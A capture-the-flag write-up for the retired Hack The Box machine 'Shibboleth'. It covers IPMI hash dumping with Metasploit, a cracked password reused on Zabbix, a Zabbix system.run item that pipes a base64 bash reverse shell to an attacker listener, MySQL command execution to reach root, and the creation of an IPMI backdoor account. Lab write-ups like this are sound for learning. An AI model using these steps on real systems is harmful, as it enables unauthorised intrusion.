# Shibboleth

| | |
|---|---|
| **Platform** | Hack The Box |
| **OS** | Linux |
| **Difficulty** | Medium |
| **IP Address** | 10.10.11.124 |
| **Status** | Retired |

## Overview
Shibboleth is a medium-difficulty Linux machine that combines IPMI (BMC) hash disclosure with a vulnerable Zabbix monitoring stack. IPMI's cipher-zero-style authentication weakness allows a remote password hash to be dumped and cracked offline, and the recovered password is reused to reach the Zabbix web UI. The Zabbix agent is then abused to execute arbitrary commands for the initial foothold, and a MySQL service reachable from that foothold is vulnerable to OS command execution, ultimately granting a root shell.

## Reconnaissance
```
80/tcp   open  http    Apache httpd 2.4.41 (Ubuntu) - "FlexStart Bootstrap Template"
623/udp  open  asf-rmcp (IPMI)
```
Virtual-host discovery uncovered several subdomains resolving to the same host:
```
monitor.shibboleth.htb
monitoring.shibboleth.htb
zabbix.shibboleth.htb
```
all serving a Zabbix login page.

## Enumeration
- The main site (`shibboleth.htb`) exposed a `changelog.txt` for a Bootstrap "FlexStart" template, which was mostly a dead end for direct exploitation but confirmed template versioning.
- Content discovery against the `zabbix.shibboleth.htb` vhost enumerated typical Zabbix front-end paths (`index.php`, `hosts.php`, `items.php`, `triggers.php`, etc.), confirming a full Zabbix installation.
- The UDP scan on port 623 confirmed IPMI (`asf-rmcp`). IPMI 2.0's RAKP authentication protocol is known to leak password hashes to any client that requests them (regardless of whether the supplied username is valid), referenced here via Metasploit's `scanner/ipmi/ipmi_dumphashes` module:
```
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run
[+] 10.10.11.124:623 - IPMI - Hash found: Administrator:710fb06f8201...
```
- Cracking the recovered hash offline yielded the credential pair `Administrator:ilovepumkinpie1`.

## Foothold
The recovered password was reused to log into the Zabbix web UI as `Administrator`. Zabbix allows creating monitored "Items" that execute agent-side system commands; a new item was created on a host with:
```
Key: system.run[echo "<base64 reverse shell>" | base64 -d | bash]
```
where the base64 payload decoded to a standard bash `/dev/tcp` reverse shell pointed at the attacker's listener (`nc -lvp 4242`). Triggering the item executed the command on the monitored host and returned a shell as the Zabbix service user, which was then stabilized with `python3 -c 'import pty;pty.spawn("/bin/bash")'`. The same recovered password was valid for the local `ipmi-svc` account, granting the user flag.

## Privilege Escalation
Enumeration of local configuration files (`/etc/zabbix/`, `/etc/mysql/`) surfaced Zabbix's MySQL database credentials (`DBName=zabbix`, `DBPassword=<redacted>`). Zabbix's own database schema is documented as vulnerable to authenticated MySQL-based OS command execution (via configured scripts/functions in the DB), which was leveraged to escalate from `ipmi-svc` to root.

## Lessons Learned
- IPMI/BMC interfaces should never be exposed on general networks; the RAKP hash-disclosure weakness is trivial to exploit with Metasploit.
- Password reuse across IPMI, application logins, and local OS accounts multiplies the impact of a single credential leak.
- Monitoring platforms like Zabbix that can execute agent-side commands are effectively remote code execution primitives once compromised: treat their admin accounts as high-value targets.

## Tools & References
- Metasploit `auxiliary/scanner/ipmi/ipmi_dumphashes`, hash-cracking tooling (e.g. `hashcat`/`john`)
- Zabbix web UI item-based command execution
- Reference: horizon3.ai write-up on CVE-2021-27927 (Zabbix CSRF-to-RCE chain), used as background research during enumeration
- `ldapserv.py` (kept under repo root: a small helper script that automates the IPMI backdoor-user creation flow used while testing the RAKP hash disclosure/authentication weakness)
- `loot.log` (single line recording a backdoor IPMI account created during testing: `10.10.11.124:backdoor2:<password>`): kept for reference, contains no long-term sensitive access.
- `wl` (single-word file containing `zabbix`, a wordlist fragment used during enumeration): kept for completeness.
